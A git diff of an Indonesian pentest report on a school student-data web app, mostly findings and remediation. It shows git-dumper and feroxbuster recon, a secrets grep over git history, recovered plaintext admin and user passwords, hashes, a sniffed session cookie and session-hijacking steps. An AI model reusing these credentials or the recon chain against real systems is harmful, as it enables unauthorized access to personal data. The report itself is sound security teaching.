-git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
-```
-
-```bash
-┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina]
-└─$ cd hasil-git/
-
-┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
-└─$ ls -la
-total 192
-drwxrwxr-x 7 gh0st4n gh0st4n  4096 Sep 21 15:59 .
-drwxrwxr-x 3 gh0st4n gh0st4n  4096 Sep 21 16:03 ..
--rw-rw-r-- 1 gh0st4n gh0st4n 16524 Sep 21 15:59 absensi.php
--rw-rw-r-- 1 gh0st4n gh0st4n 13525 Sep 21 15:59 absensi_rekap.php
-drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 classes
-drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 config
--rw-rw-r-- 1 gh0st4n gh0st4n  6959 Sep 21 15:59 db_management_data_siswa.sql
-drwxrwxr-x 7 gh0st4n gh0st4n  4096 Sep 21 15:59 .git
--rw-rw-r-- 1 gh0st4n gh0st4n  3403 Sep 21 15:59 guru_edit.php
--rw-rw-r-- 1 gh0st4n gh0st4n   894 Sep 21 15:59 guru_hapus.php
--rw-rw-r-- 1 gh0st4n gh0st4n  8005 Sep 21 15:59 guru_list.php
--rw-rw-r-- 1 gh0st4n gh0st4n  3422 Sep 21 15:59 guru_tambah.php
--rw-rw-r-- 1 gh0st4n gh0st4n  8850 Sep 21 15:59 index.php
--rw-rw-r-- 1 gh0st4n gh0st4n  4113 Sep 21 15:59 kelas_edit.php
--rw-rw-r-- 1 gh0st4n gh0st4n   769 Sep 21 15:59 kelas_hapus.php
--rw-rw-r-- 1 gh0st4n gh0st4n  7992 Sep 21 15:59 kelas_list.php
--rw-rw-r-- 1 gh0st4n gh0st4n  3464 Sep 21 15:59 kelas_tambah.php
--rw-rw-r-- 1 gh0st4n gh0st4n  7116 Sep 21 15:59 laporan.php
--rw-rw-r-- 1 gh0st4n gh0st4n  8940 Sep 21 15:59 login.php
--rw-rw-r-- 1 gh0st4n gh0st4n   185 Sep 21 15:59 logout.php
--rw-rw-r-- 1 gh0st4n gh0st4n  3783 Sep 21 15:59 siswa_detail.php
--rw-rw-r-- 1 gh0st4n gh0st4n  9789 Sep 21 15:59 siswa_edit.php
--rw-rw-r-- 1 gh0st4n gh0st4n   919 Sep 21 15:59 siswa_hapus.php
--rw-rw-r-- 1 gh0st4n gh0st4n 10448 Sep 21 15:59 siswa_list.php
--rw-rw-r-- 1 gh0st4n gh0st4n  7824 Sep 21 15:59 siswa_tambah.php
-drwxrwxr-x 3 gh0st4n gh0st4n  4096 Sep 21 15:59 uploads
-drwxrwxr-x 2 gh0st4n gh0st4n  4096 Sep 21 15:59 views
-                       
-┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
-└─$ find . -type f -name "*.php" | head -50
-./siswa_edit.php
-./index.php
-./laporan.php
-./kelas_edit.php
-./classes/kelas.php
-./classes/auth.php
-./classes/siswa.php
-./classes/database.php
-./classes/guru.php
-./kelas_list.php
-./siswa_detail.php
-./config/database.php
-./guru_hapus.php
-./guru_tambah.php
-./absensi.php
-./kelas_tambah.php
-./kelas_hapus.php
-./guru_edit.php
-./login.php
-./siswa_tambah.php
-./absensi_rekap.php
-./views/footer.php
-./views/header.php
-./guru_list.php
-./siswa_list.php
-./logout.php
-./siswa_hapus.php
-                            
-┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
-└─$ git log --oneline --all
-54cffb3 (HEAD -> main, origin/main, origin/HEAD) Hapus file skrip pemulihan fix.php demi keamanan
-b8552be First commit - Aplikasi Management Data Siswa
-
-┌──(gh0st4n㉿Gh0sT4n)-[~/Hack/Kalina/hasil-git]
-└─$ git log -p --all | grep -iE "password|passwd|secret|api_key|token|db_pass"
--$passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
--$passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
--    // 1. Pastikan ukuran kolom password cukup (255 karakter)
--    $db->exec("ALTER TABLE users MODIFY COLUMN password VARCHAR(255) NOT NULL");
--    // 2. Update password admin
--    $stmt1 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'admin'");
--    // 3. Update password user
--    $stmt2 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'user'");
--    echo "<p>Password Admin: <b>kalinadmin08</b></p>";
--    echo "<p>Password User: <b>user99887711</b></p>";
-+    public function login($username, $password) {
-+            // Password harus berupa hash
-+            if (password_verify($password, $user['password'])) {
-+    private $password = "";
-+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
-+    private $password = "";
-+                $this->password
-+  `password` varchar(255) NOT NULL,
-+INSERT INTO `users` (`id`, `username`, `password`, `nama_lengkap`, `role`, `created_at`) VALUES
-+$passAdmin = password_hash('kalinadmin08', PASSWORD_BCRYPT);
-+$passUser  = password_hash('user99887711', PASSWORD_BCRYPT);
-+    // 1. Pastikan ukuran kolom password cukup (255 karakter)
-+    $db->exec("ALTER TABLE users MODIFY COLUMN password VARCHAR(255) NOT NULL");
-+    // 2. Update password admin
-+    $stmt1 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'admin'");
-+    // 3. Update password user
-+    $stmt2 = $db->prepare("UPDATE users SET password = :pass WHERE username = 'user'");
-+    echo "<p>Password Admin: <b>kalinadmin08</b></p>";
-+    echo "<p>Password User: <b>user99887711</b></p>";
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        die("Token CSRF tidak valid.");
-+// Inisialisasi CSRF Token
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        $error = "Token CSRF tidak valid.";
-+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        $error = "Token CSRF tidak valid.";
-+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-+        die("Akses ditolak! Token CSRF tidak valid.");
-+// Inisialisasi CSRF Token
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        $error = "Token CSRF tidak valid.";
-+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+// GENERATE CSRF TOKEN
-+    empty($_SESSION['csrf_token']) ||
-+    !is_string($_SESSION['csrf_token'])
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    // Ambil CSRF token dari form
-+    $csrf_token = $_POST['csrf_token'] ?? '';
-+        empty($csrf_token) ||
-+        !is_string($csrf_token) ||
-+        !hash_equals($_SESSION['csrf_token'], $csrf_token)
-+        // Buat token baru
-+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+        // AMBIL USERNAME & PASSWORD
-+        // JANGAN trim password
-+        // Karena spasi bisa menjadi bagian dari password
-+        $password = $_POST['password'] ?? '';
-+        if ($username === '' || $password === '') {
-+            $error = "Username dan password harus diisi.";
-+            if ($auth->login($username, $password)) {
-+                // Buat CSRF token baru setelah login
-+                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+                // apakah username atau password yang salah
-+                $error = "Username atau password salah.";
-+                // Token CSRF diganti setelah percobaan gagal
-+                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+            <!-- CSRF TOKEN -->
-+                name="csrf_token"
-+                value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8'); ?>"
-+                 PASSWORD
-+                    for="password"
-+                    Password
-+                        type="password"
-+                        name="password"
-+                        id="password"
-+                        placeholder="Masukkan password"
-+                        autocomplete="new-password"
-+    const password = document.getElementById('password');
-+    if (password) {
-+        password.value = '';
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        $error = "Token CSRF tidak valid.";
-+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+// Validasi Metode POST dan Token CSRF
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (empty($_SESSION['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $token)) {
-+        die("Akses ditolak! Token CSRF tidak valid.");
-+// Inisialisasi CSRF Token
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-+if (empty($_SESSION['csrf_token'])) {
-+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-+    $token = $_POST['csrf_token'] ?? '';
-+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
-+        $error = "Token CSRF tidak valid.";
-+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
-```
-##### JACKPOT - Credential Ditemukan di Git History
-
-Dari git log -p, ketemu plaintext credential yang dihapus di commit terakhir (54cffb3) tapi masih tersimpan di history. Ini klasik banget.
-🔑 Credential yang Didapat
-
-| Role	|Username	| Password      |
-|-------|-----------|---------------|
-|Admin	|admin	    | kalinadmin08  |
-|User	|user	    | user99887711  |
-
-Dari commit b8552be (First commit) - file fix.php yang sengaja dihapus di commit 54cffb3 ("Hapus file skrip pemulihan fix.php demi keamanan").
-
-Ironinya: mereka hapus filenya, tapi lupa hapus dari git history.
-
-### Cara Eskploitasi
-
+**Eksploitasi:**
 ```
 URL: http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/login.php
 Username: admin
 Password: kalinadmin08
+```
+→ **Login berhasil sebagai admin** ✅
 
-Username: user
-Password: user99887711
+**Dampak:**
+- Full access ke aplikasi sebagai admin
+- CRUD data siswa, guru, kelas, absensi
+- Upload file
+
+**Severity:** 🔴 **CRITICAL** (CVSS 9.8)
+
+**Remediasi:**
+- Rotasi seluruh password (admin, user, DB)
+- Hapus git history:
+  ```bash
+  git filter-repo --path fix.php --invert-paths
+  ```
+- Jangan pernah commit credential ke repository
+
+### 4.3 Database Dump Ke-commit (HIGH)
+
+**Deskripsi:**
+File `db_management_data_siswa.sql` ikut ter-commit ke repository, berisi struktur DB + data siswa + hash password.
+
+**Proof of Concept:**
+```bash
+cat db_management_data_siswa.sql
 ```
 
-### Dampak:
-- **Full access ke aplikasi** sebagai admin
-- Bisa CRUD data siswa, guru, kelas, absensi
-- Bisa upload file
+**Isi:**
+- Data guru (5 record)
+- Data kelas (9 record)
+- Data siswa (22 record: NISN, nama, alamat, foto)
+- Data user (username + hash password)
 
-## TEMUAN 4: Directory ListingAktif (MEDIUM)
-### Apa Yang Ditemukan?
+**Hash Password:**
+```
+admin : d7caed25e5bf33da4e752d774afed033
+user  : f0bdd8a9ebdae53c6a61907a4333c9e9
+```
+*Catatan: hash MD5 ini kemungkinan sudah tidak valid (diganti bcrypt via `fix.php`).*
 
+**Dampak:**
+- Data pribadi siswa bocor (nama, NISN, alamat, foto)
+- Struktur DB terekspos
+
+**Severity:** 🟠 **HIGH** (CVSS 7.5)
+
+**Remediasi:**
+- Hapus file `.sql` dari repository
+- Tambahkan `*.sql` ke `.gitignore`
+- Rotasi hash password
+
+### 4.4 Directory Listing Aktif (MEDIUM)
+
+**Deskripsi:**
+Beberapa direktori mengaktifkan directory listing, memungkinkan enumerasi file.
+
+**URL:**
 ```
 http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/
+http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/config/
+http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/classes/
+http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/note/
+http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/views/
 ```
 
-### Cara Eksploitasi:
-- **Enumerasi file** - lihat semua file yang pernah di-upload
-- **Akses file sensitif** - foto siswa, surat dokter
-- **Cari file `.php`** - kalau ada yang ke-upload sebelumnya
+**Dampak:**
+- Enumerasi file yang pernah di-upload
+- Akses file sensitif (foto siswa, surat dokter)
+- Reconnaissance struktur aplikasi
 
-### Dampak:
-- **Information disclosure** - data siswa & surat dokter bisa diakses
-- **Reconnaissance** - tau struktur file upload
+**Severity:** 🟡 **MEDIUM** (CVSS 5.3)
 
-## TEMUAN 5 : BUSSINES LOGIC
-### Apa yang ditemukan
+**Remediasi:**
+```apache
+Options -Indexes
+```
 
+### 4.5 Session Hijacking via HTTP (MEDIUM)
+
+**Deskripsi:**
+Cookie `PHPSESSID` dikirim dalam bentuk **plaintext** (karena tidak ada HTTPS). Attacker di jaringan yang sama bisa sniff traffic dan mengambil cookie untuk hijack session.
+
+**Proof of Concept:**
+```
+Cookie yang ditangkap via Wireshark:
+PHPSESSID=6ridmd343lph1ec08qmghn5ua6
+```
+
+**Eksploitasi:**
+1. Sniff traffic HTTP di jaringan lokal (Wireshark / tcpdump)
+2. Ambil cookie `PHPSESSID` milik victim
+3. Inject cookie ke browser (Cookie Editor)
+4. Akses aplikasi **tanpa login**
+
+**Dampak:**
+- Akses tanpa credential
+- Jika session admin yang di-hijack → **full access**
+
+**Severity:** 🟡 **MEDIUM** (CVSS 5.9)
+
+**Remediasi:**
+- **Aktifkan HTTPS** (TLS/SSL)
+- Set cookie flag:
+  ```php
+  session_set_cookie_params([
+      'secure' => true,
+      'httponly' => true,
+      'samesite' => 'Strict'
+  ]);
+  ```
+- Regenerasi session ID setelah login (`session_regenerate_id(true)`)
+- Implementasi session timeout
+
+### 4.6 Business Logic — Validasi NISN (LOW)
+
+**Deskripsi:**
+NISN tidak divalidasi format numerik — bisa diinput karakter apa saja.
+
+**Proof of Concept:**
+Input `<script>alert(1)</script>` pada field NISN → **tersimpan di DB** (tapi tidak XSS karena output di-escape `htmlspecialchars()`).
+
+Dari screenshot `siswa_list.php`:
+```
+NISN: 010101101010
+Nama: <script>alert(1)</script>   ← muncul sebagai teks, bukan alert
+```
+
+**Dampak:**
+- Data tidak akurat
+- Memperlambat maintenance
+- Potensi data integrity issue
+
+**Severity:** 🟢 **LOW** (CVSS 3.1)
+
+**Remediasi:**
 ```php
-<td><span class="badge bg-light text-dark border"><?= htmlspecialchars($row['nisn']); ?></span></td>
-<td class="fw-bold text-dark"><?= htmlspecialchars($row['nama']); ?></td>
+if (!preg_match('/^[0-9]{10}$/', $nisn)) {
+    $error = "NISN harus 10 digit angka.";
+}
 ```
-Nggak ada fungsi **Numeric** dan **MySQL PHPMyadmin** menggunakan VARCHAR
 
-### Cara Eksploitasi
-Input pada **siswa_list.php** `-, /, 0, atau sebagai nya yang tidak sesuai dengan format NISN`
+## 5. Vektor yang Diuji & Aman
 
-### Dampak
-- Data tidak akurat dan mempersulit maintenence
+| Vektor                          | Status        | Bukti                                                                         |
+|---------------------------------|---------------|-------------------------------------------------------------------------------|
+| **SQL Injection**               | ✅ Aman      | Semua query pakai `prepare()` + `bindParam()`                                  |
+| **XSS**                         | ✅ Aman      | Output di-escape `htmlspecialchars()`                                          |
+| **CSRF**                        | ✅ Aman      | Token + `hash_equals()` di semua form                                          |
+| **BAC (Broken Access Control)** | ✅ Aman      | Role check di semua file (`$user_role !== 'admin'`)                            |
+| **Command Injection**           | ✅ Aman      | Tidak ada `exec()`, `system()`, `shell_exec()`                                 |
+| **LFI / RFI**                   | ✅ Aman      | Semua `include` statis                                                         |
+| **File Upload → RCE**           | ✅ Aman      | Whitelist ekstensi (`jpg`, `jpeg`, `png`, `webp`, `pdf`) + nama file di-random |
+| **`fix.php` Backdoor**          | ✅ Tidak ada | Sudah dihapus dari server                                                      |
+| **IDOR**                        | ✅ Tidak ada | `siswa_detail.php` bukan IDOR - semua user boleh lihat data siswa              |
 
-## TEMUAN 6: IDOR di `siswa_detail.php` (LOW)
+## 6. Matriks Risiko
 
-### Apa yang ditemukan?
+| #   | Temuan                         | Severity    | CVSS | Status                    |
+|-----|--------------------------------|-------------|------|---------------------------|
+| 4.1 | Git Repository Exposure        | 🔴 Critical | 9.1 | Confirmed                  |
+| 4.2 | Credential Leak di Git History | 🔴 Critical | 9.8 | Confirmed (login berhasil) |
+| 4.3 | Database Dump Ke-commit        | 🟠 High     | 7.5 | Confirmed                  |
+| 4.4 | Directory Listing Aktif        | 🟡 Medium   | 5.3 | Confirmed                  |
+| 4.5 | Session Hijacking via HTTP     | 🟡 Medium   | 5.9 | Confirmed                  |
+| 4.6 | Business Logic - Validasi NISN | 🟢 Low      | 3.1 | Confirmed                  |
 
+**Total:** 2 Critical, 1 High, 2 Medium, 1 Low
+
+## 7. Rekomendasi Perbaikan
+
+### Prioritas 1 (Immediate)
+1. **Blokir akses `.git`** di web server config (Apache/Nginx)
+2. **Rotasi seluruh password** (admin, user, DB)
+3. **Hapus git history** yang mengandung credential:
+   ```bash
+   git filter-repo --path fix.php --invert-paths
+   git filter-repo --path db_management_data_siswa.sql --invert-paths
+   ```
+4. **Hapus `.sql` dari repo** + tambahkan ke `.gitignore`
+
+### Prioritas 2 (Short-term)
+5. **Nonaktifkan directory listing** (`Options -Indexes`)
+6. **Aktifkan HTTPS** (TLS/SSL)
+7. **Set cookie flag**: `Secure`, `HttpOnly`, `SameSite=Strict`
+8. **Regenerasi session ID** setelah login
+
+### Prioritas 3 (Long-term)
+9. **Validasi input NISN** (hanya angka, 10 digit)
+10. **Gunakan environment variable** untuk credential (`.env`)
+11. **Aktifkan logging & monitoring** untuk akses `.git`
+12. **Security awareness training** untuk developer
+13. **Gunakan `.gitignore`** yang proper sebelum commit (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
+
+## 8. Panduan Aman Push ke GitHub
+
+> **Prinsip:** Jangan pernah commit apapun yang kamu nggak mau dilihat publik. GitHub itu public by default, dan history tersimpan selamanya.
+
+### 8.1 Buat `.gitignore` yang Proper
+
+```gitignore
+# ===== CREDENTIAL & SECRET =====
+.env
+.env.*
+!.env.example
+*.key
+*.pem
+*.p12
+*.pfx
+secrets.json
+credentials.json
+
+# ===== DATABASE =====
+*.sql
+*.sqlite
+*.db
+*.dump
+db_*.sql
+
+# ===== CONFIG =====
+config/database.php
+config/config.php
+config/settings.php
+
+# ===== BACKDOOR / FIX SCRIPTS =====
+fix.php
+fix_*.php
+reset_*.php
+test_*.php
+*_backup.php
+
+# ===== BACKUP & LOG =====
+*.bak
+*.backup
+*.old
+*.log
+logs/
+error_log
+
+# ===== IDE & OS =====
+.vscode/
+.idea/
+*.swp
+.DS_Store
+Thumbs.db
+
+# ===== DEPENDENCIES =====
+node_modules/
+vendor/
+__pycache__/
+*.pyc
+
+# ===== BUILD =====
+dist/
+build/
+*.min.js
+*.min.css
+
+# ===== UPLOAD =====
+uploads/*
+!uploads/.gitkeep
+```
+
+### 8.2 Gunakan Environment Variable
+
+Jangan hardcode credential di source code. Pakai `.env`:
+
+**Install:**
+```bash
+composer require vlucas/phpdotenv
+```
+
+**Buat `.env` (JANGAN di-commit):**
+```env
+DB_HOST=localhost
+DB_NAME=db_management_data_siswa
+DB_USER=root
+DB_PASS=your_secure_password
+```
+
+**Buat `.env.example` (INI yang di-commit):**
+```env
+DB_HOST=localhost
+DB_NAME=your_db_name
+DB_USER=your_db_user
+DB_PASS=your_db_password
+```
+
+**Update `config/database.php`:**
 ```php
-$id = $_GET['id'] ?? null;
-$query = "SELECT ... WHERE siswa.id = :id LIMIT 1";
-$stmt->bindValue(':id', $id, PDO::PARAM_INT);
-```
-**Nggak ada validasi kepemilikan** - user bisa ganti `?id=6` jadi `?id=7`.
+<?php
+require_once __DIR__ . '/../vendor/autoload.php';
 
-### Cara Eksploitasi:
+$dotenv = Dotenv\Dotenv::createImmutable(__DIR__ . '/..');
+$dotenv->load();
+
+class Database {
+    private $host;
+    private $db_name;
+    private $username;
+    private $password;
+
+    public function __construct() {
+        $this->host     = $_ENV['DB_HOST'];
+        $this->db_name  = $_ENV['DB_NAME'];
+        $this->username = $_ENV['DB_USER'];
+        $this->password = $_ENV['DB_PASS'];
+    }
+    // ...
+}
+```
+
+### 8.3 Scan Credential Sebelum Push
+
+**TruffleHog:**
+```bash
+pip install trufflehog
+trufflehog git file://. --only-verified
+```
+
+**Gitleaks:**
+```bash
+docker run -v $(pwd):/path zricethezav/gitleaks:latest detect \
+  --source="/path" --verbose
+```
+
+**Manual grep:**
+```bash
+grep -rniE "password|passwd|secret|api_key|token|private_key" . \
+  --exclude-dir=.git \
+  --exclude-dir=node_modules \
+  --exclude-dir=vendor
+```
+
+### 8.4 Pre-commit Hook — Cegah Commit Credential
+
+Buat file `.git/hooks/pre-commit`:
+
+```bash
+#!/bin/bash
+# Pre-commit hook: cegah commit credential
+
+PATTERNS=(
+    "password\s*=\s*['\"][^'\"]+['\"]"
+    "passwd\s*=\s*['\"][^'\"]+['\"]"
+    "secret\s*=\s*['\"][^'\"]+['\"]"
+    "api_key\s*=\s*['\"][^'\"]+['\"]"
+    "token\s*=\s*['\"][^'\"]+['\"]"
+    "BEGIN RSA PRIVATE KEY"
+    "BEGIN OPENSSH PRIVATE KEY"
+)
+
+FILES=$(git diff --cached --name-only --diff-filter=ACM)
+
+for file in $FILES; do
+    for pattern in "${PATTERNS[@]}"; do
+        if grep -qiE "$pattern" "$file" 2>/dev/null; then
+            echo "❌ COMMIT DITOLAK: Potensi credential di file '$file'"
+            echo "   Pattern: $pattern"
+            exit 1
+        fi
+    done
+done
+
+echo "✅ Pre-commit check passed"
+exit 0
+```
+
+Beri permission:
+```bash
+chmod +x .git/hooks/pre-commit
+```
+
+**Atau pakai `pre-commit` framework:**
+
+`.pre-commit-config.yaml`:
+```yaml
+repos:
+  - repo: https://github.com/gitleaks/gitleaks
+    rev: v8.18.0
+    hooks:
+      - id: gitleaks
+  - repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v4.5.0
+    hooks:
+      - id: detect-private-key
+      - id: check-added-large-files
+```
+
+Install:
+```bash
+pip install pre-commit
+pre-commit install
+```
+
+### 8.5 Kalau Sudah Terlanjur Commit — Bersihkan History
+
+**Pakai `git-filter-repo` (recommended):**
+```bash
+pip install git-filter-repo
+
+# Hapus file dari seluruh history
+git filter-repo --path fix.php --invert-paths
+git filter-repo --path db_management_data_siswa.sql --invert-paths
+git filter-repo --path config/database.php --invert-paths
+
+# Force push
+git push origin --force --all
+git push origin --force --tags
+```
+
+**Atau pakai BFG Repo-Cleaner:**
+```bash
+wget https://repo1.maven.org/maven2/com/madgag/bfg/1.14.0/bfg-1.14.0.jar
+java -jar bfg-1.14.0.jar --delete-files fix.php
+java -jar bfg-1.14.0.jar --delete-files "*.sql"
+
+git reflog expire --expire=now --all
+git gc --prune=now --aggressive
+git push origin --force --all
+```
+
+> ⚠️ **Peringatan:** Force push menimpa history remote. Koordinasi dengan tim dulu.
+> **Wajib:** Rotasi semua password yang bocor — history GitHub mungkin sudah di-cache / di-fork orang lain.
+
+### 8.6 Gunakan GitHub Secrets untuk CI/CD
+
+Jangan taruh credential di workflow file. Set di:
+```
+Repo → Settings → Secrets and variables → Actions → New repository secret
+```
+
+Pakai di workflow:
+```yaml
+- name: Deploy
+  env:
+    DB_HOST: ${{ secrets.DB_HOST }}
+    DB_USER: ${{ secrets.DB_USER }}
+    DB_PASS: ${{ secrets.DB_PASS }}
+  run: |
+    echo "Deploying..."
+```
+
+### 8.7 Checklist Sebelum Push
 
 ```
-http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/siswa_detail.php?id=6
-http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/siswa_detail.php?id=7
-...
+[ ] .gitignore sudah dibuat & proper
+[ ] File .env TIDAK di-commit (hanya .env.example)
+[ ] File config/database.php TIDAK di-commit
+[ ] File *.sql TIDAK di-commit
+[ ] File fix.php / reset_*.php TIDAK di-commit
+[ ] Credential di source code pakai environment variable
+[ ] Pre-commit hook sudah dipasang
+[ ] Scan credential pakai TruffleHog / Gitleaks
+[ ] git status bersih dari file sensitif
+[ ] git diff --cached sudah direview
+[ ] Repo GitHub di-set private (kalau perlu)
+[ ] GitHub Secrets dipakai untuk CI/CD
+[ ] 2FA aktif di akun GitHub
 ```
 
-### Dampak:
-- **Low** - cuma data siswa, dan admin emang boleh lihat semua
-- **Nggak berguna** karena data siswa emang buat admin
+### 8.8 Alur Push yang Benar
+
+```bash
+# 1. Inisialisasi git
+git init
+
+# 2. Buat .gitignore DULU sebelum apapun
+cat > .gitignore << 'EOF'
+.env
+.env.*
+!.env.example
+*.sql
+*.log
+config/database.php
+fix.php
+EOF
+
+# 3. Tambahkan file yang aman
+git add .gitignore
+git add README.md
+git add src/
+git add config/database.example.php
+
+# 4. Cek apa yang akan di-commit
+git status
+git diff --cached
+
+# 5. Scan credential
+grep -rniE "password|secret|api_key" . --exclude-dir=.git
+
+# 6. Commit
+git commit -m "Initial commit"
+
+# 7. Push ke GitHub
+git remote add origin https://github.com/username/repo.git
+git branch -M main
+git push -u origin main
+```
+
+### 8.9 Emergency Response — Kalau Credential Bocor
+
+**Immediate (0-1 jam):**
+1. Rotasi semua password yang bocor
+2. Revoke API key / token yang bocor
+3. Hapus file dari repo + history
+4. Force push ke remote
+
+**Short-term (1-24 jam):**
+5. Cek log akses — apakah ada login mencurigakan?
+6. Notifikasi tim — kasih tau kalau ada insiden
+7. Monitor akun / sistem terkait
+
+**Long-term (1-7 hari):**
+8. Audit semua repo untuk credential lain
+9. Update `.gitignore` di semua repo
+10. Training developer soal security
+
+## 9. Lampiran
+
+### A. Command yang Digunakan
+```bash
+# Reconnaissance
+feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina -w /usr/share/wordlists/dirb/common.txt
+
+# Git dump
+git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/.git/ ./hasil-git
+
+# Credential search
+git log -p --all | grep -iE "password|secret|api_key|token"
+
+# Directory listing check
+curl http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/
+```
+
+### B. Timeline
+| Tanggal     | Aktivitas                                         |
+|-------------|---------------------------------------------------|
+| 21 Sep 2026 | Reconnaissance + git-dumper                       |
+| 21 Sep 2026 | Analisis source code + credential leak            |
+| 22 Sep 2026 | Login admin + testing vektor lain                 |
+| 22 Sep 2026 | Session hijacking test (Wireshark)                |
+| 22 Sep 2026 | Testing upload webshell (gagal — whitelist ketat) |
+
+### C. Struktur File yang Ter-recover
+```
+hasil-git/
+├── absensi.php
+├── absensi_rekap.php
+├── classes/
+│   ├── auth.php
+│   ├── database.php
+│   ├── guru.php
+│   ├── kelas.php
+│   └── siswa.php
+├── config/
+│   └── database.php
+├── db_management_data_siswa.sql   ← DB dump
+├── guru_edit.php / guru_hapus.php / guru_list.php / guru_tambah.php
+├── index.php
+├── kelas_edit.php / kelas_hapus.php / kelas_list.php / kelas_tambah.php
+├── laporan.php
+├── login.php / logout.php
+├── siswa_detail.php / siswa_edit.php / siswa_hapus.php / siswa_list.php / siswa_tambah.php
+├── uploads/
+└── views/
+    ├── footer.php
+    └── header.php
+```
+
+### D. Referensi
+- OWASP Top 10 2021: A01 (Broken Access Control), A02 (Cryptographic Failures), A05 (Security Misconfiguration)
+- CWE-538: File and Directory Information Exposure
+- CWE-798: Use of Hard-coded Credentials
+- CWE-548: Exposure of Information Through Directory Listing
+- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
+- GitHub Docs: Removing sensitive data from a repository
+
+---
+
+**— END OF REPORT —**
+
+*Laporan ini dibuat untuk keperluan pembelajaran / authorized pentest. Penggunaan tanpa izin adalah ilegal.*
